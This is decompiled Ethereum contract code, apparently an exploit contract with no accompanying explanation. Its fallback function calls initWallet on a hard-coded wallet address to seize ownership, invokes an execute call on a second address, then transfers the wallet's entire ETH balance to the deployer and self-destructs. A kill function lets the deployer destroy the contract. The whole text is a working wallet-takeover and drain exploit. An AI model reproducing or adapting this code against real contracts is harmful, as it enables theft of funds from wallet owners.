contract main {


// =======================  Init code  ======================


address stor0;
address stor1;
address stor2;

function _fallback() {
    stor0 = msg.sender
    stor1 = 0xf199af8b17d81c41abe6220a1d7c9fe04d0d9d2c
    stor2 = 0x63c0f17c1f72e1315e3d4f8a89a37d95f1314793
    return code.data[124 len 1190]
}



// =====================  Runtime code  =====================


address stor0;
address stor1;
address stor2;

function kill() {
    require stor0 == msg.sender
    selfdestruct(stor0)
}

function _fallback() {
    if block.number < 4085220:
    mem[420 len 0] = None
    require ext_code.size(stor1)
    call stor1.initWallet(address[] rg1, uint256 rg2, uint256 rg3) with:
         gas gas_remaining - 710 wei
        args 96, 1, 100000 * 10^18, 1, mem[420]
    require ext_call.success
    require ext_code.size(stor1)
    call stor1.0xb61d27f6 with:
         gas gas_remaining - 710 wei
        args stor2, 0, 96, 4, 0, 0
    require ext_call.success
    require ext_code.size(stor1)
    call stor1.0xb61d27f6 with:
         gas gas_remaining - 710 wei
        args stor0, eth.balance(stor1), 96, 0, 0, 0
    require ext_call.success
    selfdestruct(stor0)
}



}
